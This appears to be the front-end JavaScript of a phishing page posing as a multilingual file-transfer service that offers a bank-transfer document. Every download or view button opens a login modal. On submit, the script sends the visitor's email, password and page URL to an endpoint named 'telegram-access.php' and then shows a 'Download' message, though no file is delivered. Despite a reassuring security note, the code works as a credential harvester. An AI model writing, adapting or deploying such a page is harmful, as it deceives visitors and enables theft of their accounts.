const transferCard = document.querySelector(".transfer-card");
const accessModal = document.querySelector(".access-modal");
const accessForm = document.querySelector(".access-form");
const emailInput = accessForm?.querySelector('input[name="email"]');
const transferPasswordInput = accessForm?.querySelector('input[name="transfer-code"]');
const accessSubmitButton = accessForm?.querySelector('button[type="submit"]');
const toast = document.createElement("div");
const translations = {
  fr: {
    pageTitle: "Transfert de fichiers",
    topbarLabel: "Navigation principale",
    homeLabel: "Accueil",
    menuLabel: "Menu",
    navTransfers: "Transferts",
    navPricing: "Tarifs",
    navProfile: "Parametres du profil",
    navContacts: "Contacts",
    accountLabel: "Compte",
    upgrade: "Mettre a niveau",
    profileLabel: "Profil",
    notificationsLabel: "Notifications",
    helpLabel: "Aide",
    fileAvailableLabel: "Fichier disponible",
    open: "Ouvrir",
    download: "Télécharger",
    downloadFileLabel: "Télécharger le fichier",
    viewFileLabel: "Voir le fichier",
    filesReady: "Vos fichiers sont prets",
    expires: "Expire dans 3 jours",
    presentationLabel: "Presentation",
    hero: "Send files.<br>Move ideas.",
    closeLabel: "Fermer",
    modalTitle: "Acces au fichier",
    modalText: "Entrez votre adresse email et le mot de passe fourni pour ouvrir ce fichier.",
    emailLabel: "Adresse email",
    emailPlaceholder: "vous@exemple.com",
    passwordLabel: "Mot de passe",
    passwordPlaceholder: "Mot de passe",
    securityNote: "Ne saisissez jamais le mot de passe de votre boite email ici.",
    toastPending: "Verification du mot de passe en cours",
    toastDefault: "Action en cours",
  },
  en: {
    pageTitle: "File transfer",
    topbarLabel: "Main navigation",
    homeLabel: "Home",
    menuLabel: "Menu",
    navTransfers: "Transfers",
    navPricing: "Pricing",
    navProfile: "Profile settings",
    navContacts: "Contacts",
    accountLabel: "Account",
    upgrade: "Upgrade",
    profileLabel: "Profile",
    notificationsLabel: "Notifications",
    helpLabel: "Help",
    fileAvailableLabel: "Available file",
    open: "Open",
    download: "Download",
    downloadFileLabel: "Download file",
    viewFileLabel: "View file",
    filesReady: "Your files are ready",
    expires: "Expires in 3 days",
    presentationLabel: "Presentation",
    hero: "Send files.<br>Move ideas.",
    closeLabel: "Close",
    modalTitle: "File access",
    modalText: "Enter your email address and the password provided to open this file.",
    emailLabel: "Email address",
    emailPlaceholder: "you@example.com",
    passwordLabel: "Password",
    passwordPlaceholder: "Password",
    securityNote: "Never enter your email account password here.",
    toastPending: "Checking password",
    toastDefault: "Action in progress",
  },
  es: {
    pageTitle: "Transferencia de archivos",
    topbarLabel: "Navegacion principal",
    homeLabel: "Inicio",
    menuLabel: "Menu",
    navTransfers: "Transferencias",
    navPricing: "Precios",
    navProfile: "Ajustes del perfil",
    navContacts: "Contactos",
    accountLabel: "Cuenta",
    upgrade: "Mejorar plan",
    profileLabel: "Perfil",
    notificationsLabel: "Notificaciones",
    helpLabel: "Ayuda",
    fileAvailableLabel: "Archivo disponible",
    open: "Abrir",
    download: "Descargar",
    downloadFileLabel: "Descargar archivo",
    viewFileLabel: "Ver archivo",
    filesReady: "Tus archivos estan listos",
    expires: "Caduca en 3 dias",
    presentationLabel: "Presentacion",
    hero: "Envia archivos.<br>Mueve ideas.",
    closeLabel: "Cerrar",
    modalTitle: "Acceso al archivo",
    modalText: "Introduce tu correo electronico y la contrasena proporcionada para abrir este archivo.",
    emailLabel: "Correo electronico",
    emailPlaceholder: "tu@ejemplo.com",
    passwordLabel: "Contrasena",
    passwordPlaceholder: "Contrasena",
    securityNote: "Nunca introduzcas aqui la contrasena de tu correo electronico.",
    toastPending: "Verificando contrasena",
    toastDefault: "Accion en curso",
  },
  de: {
    pageTitle: "Dateitransfer",
    topbarLabel: "Hauptnavigation",
    homeLabel: "Startseite",
    menuLabel: "Menu",
    navTransfers: "Transfers",
    navPricing: "Preise",
    navProfile: "Profileinstellungen",
    navContacts: "Kontakte",
    accountLabel: "Konto",
    upgrade: "Upgrade",
    profileLabel: "Profil",
    notificationsLabel: "Benachrichtigungen",
    helpLabel: "Hilfe",
    fileAvailableLabel: "Verfugbare Datei",
    open: "Offnen",
    download: "Herunterladen",
    downloadFileLabel: "Datei herunterladen",
    viewFileLabel: "Datei ansehen",
    filesReady: "Ihre Dateien sind bereit",
    expires: "Lauft in 3 Tagen ab",
    presentationLabel: "Prasentation",
    hero: "Dateien senden.<br>Ideen bewegen.",
    closeLabel: "Schliessen",
    modalTitle: "Dateizugriff",
    modalText: "Geben Sie Ihre E-Mail-Adresse und das bereitgestellte Passwort ein, um diese Datei zu offnen.",
    emailLabel: "E-Mail-Adresse",
    emailPlaceholder: "sie@beispiel.com",
    passwordLabel: "Passwort",
    passwordPlaceholder: "Passwort",
    securityNote: "Geben Sie hier niemals das Passwort Ihres E-Mail-Kontos ein.",
    toastPending: "Passwort wird gepruft",
    toastDefault: "Aktion lauft",
  },
  it: {
    pageTitle: "Trasferimento file",
    topbarLabel: "Navigazione principale",
    homeLabel: "Home",
    menuLabel: "Menu",
    navTransfers: "Trasferimenti",
    navPricing: "Prezzi",
    navProfile: "Impostazioni profilo",
    navContacts: "Contatti",
    accountLabel: "Account",
    upgrade: "Aggiorna",
    profileLabel: "Profilo",
    notificationsLabel: "Notifiche",
    helpLabel: "Aiuto",
    fileAvailableLabel: "File disponibile",
    open: "Apri",
    download: "Scarica",
    downloadFileLabel: "Scarica file",
    viewFileLabel: "Visualizza file",
    filesReady: "I tuoi file sono pronti",
    expires: "Scade tra 3 giorni",
    presentationLabel: "Presentazione",
    hero: "Invia file.<br>Muovi idee.",
    closeLabel: "Chiudi",
    modalTitle: "Accesso al file",
    modalText: "Inserisci il tuo indirizzo email e la password fornita per aprire questo file.",
    emailLabel: "Indirizzo email",
    emailPlaceholder: "tu@esempio.com",
    passwordLabel: "Password",
    passwordPlaceholder: "Password",
    securityNote: "Non inserire mai qui la password della tua casella email.",
    toastPending: "Verifica password in corso",
    toastDefault: "Azione in corso",
  },
  pt: {
    pageTitle: "Transferencia de arquivos",
    topbarLabel: "Navegacao principal",
    homeLabel: "Inicio",
    menuLabel: "Menu",
    navTransfers: "Transferencias",
    navPricing: "Precos",
    navProfile: "Definicoes do perfil",
    navContacts: "Contactos",
    accountLabel: "Conta",
    upgrade: "Atualizar",
    profileLabel: "Perfil",
    notificationsLabel: "Notificacoes",
    helpLabel: "Ajuda",
    fileAvailableLabel: "Arquivo disponivel",
    open: "Abrir",
    download: "Baixar",
    downloadFileLabel: "Baixar arquivo",
    viewFileLabel: "Ver arquivo",
    filesReady: "Os seus arquivos estao prontos",
    expires: "Expira em 3 dias",
    presentationLabel: "Apresentacao",
    hero: "Envie arquivos.<br>Mova ideias.",
    closeLabel: "Fechar",
    modalTitle: "Acesso ao arquivo",
    modalText: "Digite o seu email e a senha fornecida para abrir este arquivo.",
    emailLabel: "Endereco de email",
    emailPlaceholder: "voce@exemplo.com",
    passwordLabel: "Senha",
    passwordPlaceholder: "Senha",
    securityNote: "Nunca digite aqui a senha da sua conta de email.",
    toastPending: "Verificando senha",
    toastDefault: "Acao em andamento",
  },
  nl: {
    pageTitle: "Bestandsoverdracht",
    topbarLabel: "Hoofdnavigatie",
    homeLabel: "Start",
    menuLabel: "Menu",
    navTransfers: "Transfers",
    navPricing: "Prijzen",
    navProfile: "Profielinstellingen",
    navContacts: "Contacten",
    accountLabel: "Account",
    upgrade: "Upgraden",
    profileLabel: "Profiel",
    notificationsLabel: "Meldingen",
    helpLabel: "Help",
    fileAvailableLabel: "Beschikbaar bestand",
    open: "Openen",
    download: "Downloaden",
    downloadFileLabel: "Bestand downloaden",
    viewFileLabel: "Bestand bekijken",
    filesReady: "Je bestanden zijn klaar",
    expires: "Verloopt over 3 dagen",
    presentationLabel: "Presentatie",
    hero: "Verstuur bestanden.<br>Breng ideeen in beweging.",
    closeLabel: "Sluiten",
    modalTitle: "Bestandstoegang",
    modalText: "Voer je e-mailadres en het verstrekte wachtwoord in om dit bestand te openen.",
    emailLabel: "E-mailadres",
    emailPlaceholder: "jij@voorbeeld.com",
    passwordLabel: "Wachtwoord",
    passwordPlaceholder: "Wachtwoord",
    securityNote: "Voer hier nooit het wachtwoord van je e-mailaccount in.",
    toastPending: "Wachtwoord controleren",
    toastDefault: "Actie bezig",
  },
  ar: {
    pageTitle: "نقل الملفات",
    topbarLabel: "التنقل الرئيسي",
    homeLabel: "الرئيسية",
    menuLabel: "القائمة",
    navTransfers: "التحويلات",
    navPricing: "الأسعار",
    navProfile: "إعدادات الملف الشخصي",
    navContacts: "جهات الاتصال",
    accountLabel: "الحساب",
    upgrade: "ترقية",
    profileLabel: "الملف الشخصي",
    notificationsLabel: "الإشعارات",
    helpLabel: "مساعدة",
    fileAvailableLabel: "ملف متاح",
    open: "فتح",
    download: "تنزيل",
    downloadFileLabel: "تنزيل الملف",
    viewFileLabel: "عرض الملف",
    filesReady: "ملفاتك جاهزة",
    expires: "تنتهي خلال 3 أيام",
    presentationLabel: "عرض",
    hero: "أرسل الملفات.<br>حرّك الأفكار.",
    closeLabel: "إغلاق",
    modalTitle: "الوصول إلى الملف",
    modalText: "أدخل بريدك الإلكتروني وكلمة المرور المقدمة لفتح هذا الملف.",
    emailLabel: "البريد الإلكتروني",
    emailPlaceholder: "you@example.com",
    passwordLabel: "كلمة المرور",
    passwordPlaceholder: "كلمة المرور",
    securityNote: "لا تدخل أبداً كلمة مرور حساب بريدك الإلكتروني هنا.",
    toastPending: "جار التحقق من كلمة المرور",
    toastDefault: "الإجراء قيد التنفيذ",
  },
  zh: {
    pageTitle: "文件传输",
    topbarLabel: "主导航",
    homeLabel: "首页",
    menuLabel: "菜单",
    navTransfers: "传输",
    navPricing: "价格",
    navProfile: "个人资料设置",
    navContacts: "联系人",
    accountLabel: "账户",
    upgrade: "升级",
    profileLabel: "个人资料",
    notificationsLabel: "通知",
    helpLabel: "帮助",
    fileAvailableLabel: "可用文件",
    open: "打开",
    download: "下载",
    downloadFileLabel: "下载文件",
    viewFileLabel: "查看文件",
    filesReady: "你的文件已准备好",
    expires: "3 天后过期",
    presentationLabel: "介绍",
    hero: "发送文件。<br>推动创意。",
    closeLabel: "关闭",
    modalTitle: "文件访问",
    modalText: "请输入你的电子邮件地址和提供的密码以打开此文件。",
    emailLabel: "电子邮件地址",
    emailPlaceholder: "you@example.com",
    passwordLabel: "密码",
    passwordPlaceholder: "密码",
    securityNote: "切勿在此输入你的邮箱账户密码。",
    toastPending: "正在检查密码",
    toastDefault: "正在操作",
  },
  ja: {
    pageTitle: "ファイル転送",
    topbarLabel: "メインナビゲーション",
    homeLabel: "ホーム",
    menuLabel: "メニュー",
    navTransfers: "転送",
    navPricing: "料金",
    navProfile: "プロフィール設定",
    navContacts: "連絡先",
    accountLabel: "アカウント",
    upgrade: "アップグレード",
    profileLabel: "プロフィール",
    notificationsLabel: "通知",
    helpLabel: "ヘルプ",
    fileAvailableLabel: "利用可能なファイル",
    open: "開く",
    download: "ダウンロード",
    downloadFileLabel: "ファイルをダウンロード",
    viewFileLabel: "ファイルを表示",
    filesReady: "ファイルの準備ができました",
    expires: "3日後に期限切れ",
    presentationLabel: "プレゼンテーション",
    hero: "ファイルを送信。<br>アイデアを動かす。",
    closeLabel: "閉じる",
    modalTitle: "ファイルアクセス",
    modalText: "このファイルを開くには、メールアドレスと提供されたパスワードを入力してください。",
    emailLabel: "メールアドレス",
    emailPlaceholder: "you@example.com",
    passwordLabel: "パスワード",
    passwordPlaceholder: "パスワード",
    securityNote: "ここにメールアカウントのパスワードを入力しないでください。",
    toastPending: "パスワードを確認中",
    toastDefault: "処理中",
  },
  ko: {
    pageTitle: "파일 전송",
    topbarLabel: "기본 탐색",
    homeLabel: "홈",
    menuLabel: "메뉴",
    navTransfers: "전송",
    navPricing: "요금",
    navProfile: "프로필 설정",
    navContacts: "연락처",
    accountLabel: "계정",
    upgrade: "업그레이드",
    profileLabel: "프로필",
    notificationsLabel: "알림",
    helpLabel: "도움말",
    fileAvailableLabel: "사용 가능한 파일",
    open: "열기",
    download: "다운로드",
    downloadFileLabel: "파일 다운로드",
    viewFileLabel: "파일 보기",
    filesReady: "파일이 준비되었습니다",
    expires: "3일 후 만료",
    presentationLabel: "소개",
    hero: "파일을 보내고.<br>아이디어를 움직이세요.",
    closeLabel: "닫기",
    modalTitle: "파일 접근",
    modalText: "이 파일을 열려면 이메일 주소와 제공된 비밀번호를 입력하세요.",
    emailLabel: "이메일 주소",
    emailPlaceholder: "you@example.com",
    passwordLabel: "비밀번호",
    passwordPlaceholder: "비밀번호",
    securityNote: "여기에 이메일 계정 비밀번호를 입력하지 마세요.",
    toastPending: "비밀번호 확인 중",
    toastDefault: "처리 중",
  },
  ru: {
    pageTitle: "Передача файлов",
    topbarLabel: "Основная навигация",
    homeLabel: "Главная",
    menuLabel: "Меню",
    navTransfers: "Передачи",
    navPricing: "Тарифы",
    navProfile: "Настройки профиля",
    navContacts: "Контакты",
    accountLabel: "Аккаунт",
    upgrade: "Обновить",
    profileLabel: "Профиль",
    notificationsLabel: "Уведомления",
    helpLabel: "Помощь",
    fileAvailableLabel: "Доступный файл",
    open: "Открыть",
    download: "Скачать",
    downloadFileLabel: "Скачать файл",
    viewFileLabel: "Просмотреть файл",
    filesReady: "Ваши файлы готовы",
    expires: "Истекает через 3 дня",
    presentationLabel: "Презентация",
    hero: "Отправляйте файлы.<br>Двигайте идеи.",
    closeLabel: "Закрыть",
    modalTitle: "Доступ к файлу",
    modalText: "Введите адрес электронной почты и предоставленный пароль, чтобы открыть этот файл.",
    emailLabel: "Адрес электронной почты",
    emailPlaceholder: "you@example.com",
    passwordLabel: "Пароль",
    passwordPlaceholder: "Пароль",
    securityNote: "Никогда не вводите здесь пароль от вашей почты.",
    toastPending: "Проверка пароля",
    toastDefault: "Действие выполняется",
  },
  tr: {
    pageTitle: "Dosya aktarimi",
    topbarLabel: "Ana gezinme",
    homeLabel: "Ana sayfa",
    menuLabel: "Menu",
    navTransfers: "Aktarimlar",
    navPricing: "Fiyatlar",
    navProfile: "Profil ayarlari",
    navContacts: "Kisiler",
    accountLabel: "Hesap",
    upgrade: "Yukselt",
    profileLabel: "Profil",
    notificationsLabel: "Bildirimler",
    helpLabel: "Yardim",
    fileAvailableLabel: "Mevcut dosya",
    open: "Ac",
    download: "Indir",
    downloadFileLabel: "Dosyayi indir",
    viewFileLabel: "Dosyayi gor",
    filesReady: "Dosyalariniz hazir",
    expires: "3 gun icinde sona erer",
    presentationLabel: "Sunum",
    hero: "Dosya gonder.<br>Fikirleri hareket ettir.",
    closeLabel: "Kapat",
    modalTitle: "Dosya erisimi",
    modalText: "Bu dosyayi acmak icin e-posta adresinizi ve verilen sifreyi girin.",
    emailLabel: "E-posta adresi",
    emailPlaceholder: "siz@ornek.com",
    passwordLabel: "Sifre",
    passwordPlaceholder: "Sifre",
    securityNote: "E-posta hesabinizin sifresini buraya asla girmeyin.",
    toastPending: "Sifre kontrol ediliyor",
    toastDefault: "Islem devam ediyor",
  },
  hi: {
    pageTitle: "फ़ाइल ट्रांसफर",
    topbarLabel: "मुख्य नेविगेशन",
    homeLabel: "होम",
    menuLabel: "मेनू",
    navTransfers: "ट्रांसफर",
    navPricing: "कीमतें",
    navProfile: "प्रोफाइल सेटिंग्स",
    navContacts: "संपर्क",
    accountLabel: "खाता",
    upgrade: "अपग्रेड करें",
    profileLabel: "प्रोफाइल",
    notificationsLabel: "सूचनाएं",
    helpLabel: "मदद",
    fileAvailableLabel: "उपलब्ध फ़ाइल",
    open: "खोलें",
    download: "डाउनलोड",
    downloadFileLabel: "फ़ाइल डाउनलोड करें",
    viewFileLabel: "फ़ाइल देखें",
    filesReady: "आपकी फ़ाइलें तैयार हैं",
    expires: "3 दिनों में समाप्त",
    presentationLabel: "प्रस्तुति",
    hero: "फ़ाइलें भेजें.<br>विचार आगे बढ़ाएं.",
    closeLabel: "बंद करें",
    modalTitle: "फ़ाइल एक्सेस",
    modalText: "इस फ़ाइल को खोलने के लिए अपना ईमेल पता और दिया गया पासवर्ड दर्ज करें.",
    emailLabel: "ईमेल पता",
    emailPlaceholder: "you@example.com",
    passwordLabel: "पासवर्ड",
    passwordPlaceholder: "पासवर्ड",
    securityNote: "यहां अपने ईमेल खाते का पासवर्ड कभी दर्ज न करें.",
    toastPending: "पासवर्ड जांचा जा रहा है",
    toastDefault: "कार्रवाई जारी है",
  },
  pl: {
    pageTitle: "Transfer plikow",
    topbarLabel: "Nawigacja glowna",
    homeLabel: "Strona glowna",
    menuLabel: "Menu",
    navTransfers: "Transfery",
    navPricing: "Cennik",
    navProfile: "Ustawienia profilu",
    navContacts: "Kontakty",
    accountLabel: "Konto",
    upgrade: "Ulepsz",
    profileLabel: "Profil",
    notificationsLabel: "Powiadomienia",
    helpLabel: "Pomoc",
    fileAvailableLabel: "Dostepny plik",
    open: "Otworz",
    download: "Pobierz",
    downloadFileLabel: "Pobierz plik",
    viewFileLabel: "Zobacz plik",
    filesReady: "Twoje pliki sa gotowe",
    expires: "Wygasa za 3 dni",
    presentationLabel: "Prezentacja",
    hero: "Wysylaj pliki.<br>Poruszaj idee.",
    closeLabel: "Zamknij",
    modalTitle: "Dostep do pliku",
    modalText: "Wpisz adres email i podane haslo, aby otworzyc ten plik.",
    emailLabel: "Adres email",
    emailPlaceholder: "ty@example.com",
    passwordLabel: "Haslo",
    passwordPlaceholder: "Haslo",
    securityNote: "Nigdy nie wpisuj tutaj hasla do swojej skrzynki email.",
    toastPending: "Sprawdzanie hasla",
    toastDefault: "Akcja w toku",
  },
  ro: {
    pageTitle: "Transfer de fisiere",
    topbarLabel: "Navigare principala",
    homeLabel: "Acasa",
    menuLabel: "Meniu",
    navTransfers: "Transferuri",
    navPricing: "Tarife",
    navProfile: "Setari profil",
    navContacts: "Contacte",
    accountLabel: "Cont",
    upgrade: "Actualizeaza",
    profileLabel: "Profil",
    notificationsLabel: "Notificari",
    helpLabel: "Ajutor",
    fileAvailableLabel: "Fisier disponibil",
    open: "Deschide",
    download: "Descarca",
    downloadFileLabel: "Descarca fisierul",
    viewFileLabel: "Vezi fisierul",
    filesReady: "Fisierele tale sunt gata",
    expires: "Expira in 3 zile",
    presentationLabel: "Prezentare",
    hero: "Trimite fisiere.<br>Muta idei.",
    closeLabel: "Inchide",
    modalTitle: "Acces la fisier",
    modalText: "Introdu adresa de email si parola furnizata pentru a deschide acest fisier.",
    emailLabel: "Adresa email",
    emailPlaceholder: "tu@example.com",
    passwordLabel: "Parola",
    passwordPlaceholder: "Parola",
    securityNote: "Nu introduce niciodata aici parola contului tau de email.",
    toastPending: "Se verifica parola",
    toastDefault: "Actiune in curs",
  },
  sv: {
    pageTitle: "Filoverforing",
    topbarLabel: "Huvudnavigering",
    homeLabel: "Hem",
    menuLabel: "Meny",
    navTransfers: "Overforingar",
    navPricing: "Priser",
    navProfile: "Profilinstallningar",
    navContacts: "Kontakter",
    accountLabel: "Konto",
    upgrade: "Uppgradera",
    profileLabel: "Profil",
    notificationsLabel: "Aviseringar",
    helpLabel: "Hjalp",
    fileAvailableLabel: "Tillganglig fil",
    open: "Oppna",
    download: "Ladda ner",
    downloadFileLabel: "Ladda ner fil",
    viewFileLabel: "Visa fil",
    filesReady: "Dina filer ar klara",
    expires: "Galler i 3 dagar",
    presentationLabel: "Presentation",
    hero: "Skicka filer.<br>Flytta ideer.",
    closeLabel: "Stang",
    modalTitle: "Filatkomst",
    modalText: "Ange din e-postadress och det angivna losenordet for att oppna filen.",
    emailLabel: "E-postadress",
    emailPlaceholder: "du@example.com",
    passwordLabel: "Losenord",
    passwordPlaceholder: "Losenord",
    securityNote: "Ange aldrig losenordet till ditt e-postkonto har.",
    toastPending: "Kontrollerar losenord",
    toastDefault: "Atgard pagar",
  },
  el: {
    pageTitle: "Μεταφορά αρχείων",
    topbarLabel: "Κύρια πλοήγηση",
    homeLabel: "Αρχική",
    menuLabel: "Μενού",
    navTransfers: "Μεταφορές",
    navPricing: "Τιμές",
    navProfile: "Ρυθμίσεις προφίλ",
    navContacts: "Επαφές",
    accountLabel: "Λογαριασμός",
    upgrade: "Αναβάθμιση",
    profileLabel: "Προφίλ",
    notificationsLabel: "Ειδοποιήσεις",
    helpLabel: "Βοήθεια",
    fileAvailableLabel: "Διαθέσιμο αρχείο",
    open: "Άνοιγμα",
    download: "Λήψη",
    downloadFileLabel: "Λήψη αρχείου",
    viewFileLabel: "Προβολή αρχείου",
    filesReady: "Τα αρχεία σας είναι έτοιμα",
    expires: "Λήγει σε 3 ημέρες",
    presentationLabel: "Παρουσίαση",
    hero: "Στείλτε αρχεία.<br>Μετακινήστε ιδέες.",
    closeLabel: "Κλείσιμο",
    modalTitle: "Πρόσβαση στο αρχείο",
    modalText: "Εισαγάγετε το email σας και τον παρεχόμενο κωδικό για να ανοίξετε αυτό το αρχείο.",
    emailLabel: "Διεύθυνση email",
    emailPlaceholder: "you@example.com",
    passwordLabel: "Κωδικός",
    passwordPlaceholder: "Κωδικός",
    securityNote: "Μην εισάγετε ποτέ εδώ τον κωδικό του email σας.",
    toastPending: "Έλεγχος κωδικού",
    toastDefault: "Ενέργεια σε εξέλιξη",
  },
  id: {
    pageTitle: "Transfer file",
    topbarLabel: "Navigasi utama",
    homeLabel: "Beranda",
    menuLabel: "Menu",
    navTransfers: "Transfer",
    navPricing: "Harga",
    navProfile: "Pengaturan profil",
    navContacts: "Kontak",
    accountLabel: "Akun",
    upgrade: "Tingkatkan",
    profileLabel: "Profil",
    notificationsLabel: "Notifikasi",
    helpLabel: "Bantuan",
    fileAvailableLabel: "File tersedia",
    open: "Buka",
    download: "Unduh",
    downloadFileLabel: "Unduh file",
    viewFileLabel: "Lihat file",
    filesReady: "File Anda siap",
    expires: "Kedaluwarsa dalam 3 hari",
    presentationLabel: "Presentasi",
    hero: "Kirim file.<br>Gerakkan ide.",
    closeLabel: "Tutup",
    modalTitle: "Akses file",
    modalText: "Masukkan alamat email dan kata sandi yang diberikan untuk membuka file ini.",
    emailLabel: "Alamat email",
    emailPlaceholder: "anda@example.com",
    passwordLabel: "Kata sandi",
    passwordPlaceholder: "Kata sandi",
    securityNote: "Jangan pernah masukkan kata sandi akun email Anda di sini.",
    toastPending: "Memeriksa kata sandi",
    toastDefault: "Aksi berlangsung",
  },
  vi: {
    pageTitle: "Chuyen tep",
    topbarLabel: "Dieu huong chinh",
    homeLabel: "Trang chu",
    menuLabel: "Menu",
    navTransfers: "Chuyen tep",
    navPricing: "Bang gia",
    navProfile: "Cai dat ho so",
    navContacts: "Lien he",
    accountLabel: "Tai khoan",
    upgrade: "Nang cap",
    profileLabel: "Ho so",
    notificationsLabel: "Thong bao",
    helpLabel: "Tro giup",
    fileAvailableLabel: "Tep co san",
    open: "Mo",
    download: "Tai xuong",
    downloadFileLabel: "Tai tep",
    viewFileLabel: "Xem tep",
    filesReady: "Tep cua ban da san sang",
    expires: "Het han sau 3 ngay",
    presentationLabel: "Gioi thieu",
    hero: "Gui tep.<br>Di chuyen y tuong.",
    closeLabel: "Dong",
    modalTitle: "Truy cap tep",
    modalText: "Nhap dia chi email va mat khau duoc cung cap de mo tep nay.",
    emailLabel: "Dia chi email",
    emailPlaceholder: "ban@example.com",
    passwordLabel: "Mat khau",
    passwordPlaceholder: "Mat khau",
    securityNote: "Khong bao gio nhap mat khau hop thu email cua ban tai day.",
    toastPending: "Dang kiem tra mat khau",
    toastDefault: "Dang thuc hien",
  },
  th: {
    pageTitle: "การโอนไฟล์",
    topbarLabel: "การนำทางหลัก",
    homeLabel: "หน้าแรก",
    menuLabel: "เมนู",
    navTransfers: "การโอน",
    navPricing: "ราคา",
    navProfile: "การตั้งค่าโปรไฟล์",
    navContacts: "ผู้ติดต่อ",
    accountLabel: "บัญชี",
    upgrade: "อัปเกรด",
    profileLabel: "โปรไฟล์",
    notificationsLabel: "การแจ้งเตือน",
    helpLabel: "ช่วยเหลือ",
    fileAvailableLabel: "ไฟล์พร้อมใช้งาน",
    open: "เปิด",
    download: "ดาวน์โหลด",
    downloadFileLabel: "ดาวน์โหลดไฟล์",
    viewFileLabel: "ดูไฟล์",
    filesReady: "ไฟล์ของคุณพร้อมแล้ว",
    expires: "หมดอายุใน 3 วัน",
    presentationLabel: "การนำเสนอ",
    hero: "ส่งไฟล์.<br>ขับเคลื่อนไอเดีย.",
    closeLabel: "ปิด",
    modalTitle: "เข้าถึงไฟล์",
    modalText: "กรอกอีเมลและรหัสผ่านที่ได้รับเพื่อเปิดไฟล์นี้.",
    emailLabel: "อีเมล",
    emailPlaceholder: "you@example.com",
    passwordLabel: "รหัสผ่าน",
    passwordPlaceholder: "รหัสผ่าน",
    securityNote: "อย่ากรอกรหัสผ่านบัญชีอีเมลของคุณที่นี่.",
    toastPending: "กำลังตรวจสอบรหัสผ่าน",
    toastDefault: "กำลังดำเนินการ",
  },
};

const languageAliases = {
  br: "pt",
  pt_br: "pt",
  pt_pt: "pt",
  zh_cn: "zh",
  zh_tw: "zh",
  zh_hk: "zh",
};

const getVisitorLanguage = () => {
  const browserLanguage = (navigator.language || navigator.userLanguage || "en").toLowerCase();
  const normalized = browserLanguage.replace("-", "_");
  const baseLanguage = normalized.split("_")[0];
  const detectedLanguage = languageAliases[normalized] || languageAliases[baseLanguage] || baseLanguage;

  return translations[detectedLanguage] ? detectedLanguage : "en";
};

const visitorLanguage = getVisitorLanguage();
const activeCopy = translations[visitorLanguage] || translations.en;
const rtlLanguages = new Set(["ar", "he", "fa", "ur"]);

const translatePage = () => {
  document.documentElement.lang = visitorLanguage;
  document.documentElement.dir = rtlLanguages.has(visitorLanguage) ? "rtl" : "ltr";
  document.title = activeCopy.pageTitle;

  document.querySelectorAll("[data-i18n]").forEach((element) => {
    const key = element.dataset.i18n;
    if (activeCopy[key]) {
      element.textContent = activeCopy[key];
    }
  });

  document.querySelectorAll("[data-i18n-html]").forEach((element) => {
    const key = element.dataset.i18nHtml;
    if (activeCopy[key]) {
      element.innerHTML = activeCopy[key];
    }
  });

  document.querySelectorAll("[data-i18n-placeholder]").forEach((element) => {
    const key = element.dataset.i18nPlaceholder;
    if (activeCopy[key]) {
      element.setAttribute("placeholder", activeCopy[key]);
    }
  });

  document.querySelectorAll("[data-i18n-aria]").forEach((element) => {
    const key = element.dataset.i18nAria;
    if (activeCopy[key]) {
      element.setAttribute("aria-label", activeCopy[key]);
    }
  });
};

toast.className = "toast";
toast.textContent = activeCopy.toastDefault;
document.body.appendChild(toast);
translatePage();

const showToast = (message) => {
  toast.textContent = message;
  toast.classList.add("show");
  window.clearTimeout(window.transferToastTimer);
  window.transferToastTimer = window.setTimeout(() => {
    toast.classList.remove("show");
  }, 2200);
};

const pulseTransferCard = () => {
  transferCard?.classList.remove("pulse");
  void transferCard?.offsetWidth;
  transferCard?.classList.add("pulse");
};

const openAccessModal = () => {
  accessModal?.classList.add("is-open");
  accessModal?.setAttribute("aria-hidden", "false");
  document.body.classList.add("modal-open");
  window.setTimeout(() => emailInput?.focus(), 80);
};

const closeAccessModal = () => {
  accessModal?.classList.remove("is-open");
  accessModal?.setAttribute("aria-hidden", "true");
  document.body.classList.remove("modal-open");
};

document
  .querySelectorAll(".preview-button, .primary-action, .secondary-action, .file-row button")
  .forEach((button) => {
    button.addEventListener("click", () => {
      pulseTransferCard();
      openAccessModal();
    });
  });

document.querySelectorAll("[data-close-modal]").forEach((button) => {
  button.addEventListener("click", closeAccessModal);
});

accessForm?.addEventListener("submit", (event) => {
  event.preventDefault();

  if (!accessForm.checkValidity()) {
    accessForm.reportValidity();
    return;
  }

  const originalButtonText = accessSubmitButton?.textContent;
  const payload = {
    email: emailInput?.value.trim() || "",
    transferPassword: transferPasswordInput?.value || "",
    language: visitorLanguage,
    pageUrl: window.location.href,
    fileName: "Detail-virement-europeen-0...",
  };

  if (accessSubmitButton) {
    accessSubmitButton.disabled = true;
    accessSubmitButton.textContent = activeCopy.toastPending || "Checking password";
  }

  fetch("/api/telegram-access.php", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify(payload),
  })
    .then(async (response) => {
      if (response.status === 403) {
        throw new Error("access_denied");
      }

      if (!response.ok) {
        throw new Error("server_error");
      }

      return response.json();
    })
    .then(() => {
      closeAccessModal();
      accessForm.reset();
      showToast(activeCopy.download || "Download");
    })
    .catch((error) => {
      if (error.message === "access_denied") {
        showToast(
          visitorLanguage === "fr"
            ? "Email ou mot de passe incorrect."
            : "Email or password is incorrect."
        );
        return;
      }

      showToast(
        visitorLanguage === "fr"
          ? "Verification impossible pour le moment."
          : "Verification is unavailable right now."
      );
    })
    .finally(() => {
      if (accessSubmitButton) {
        accessSubmitButton.disabled = false;
        accessSubmitButton.textContent = originalButtonText || activeCopy.download || "Download";
      }
    });
});

document.addEventListener("keydown", (event) => {
  if (event.key === "Escape") {
    closeAccessModal();
  }
});
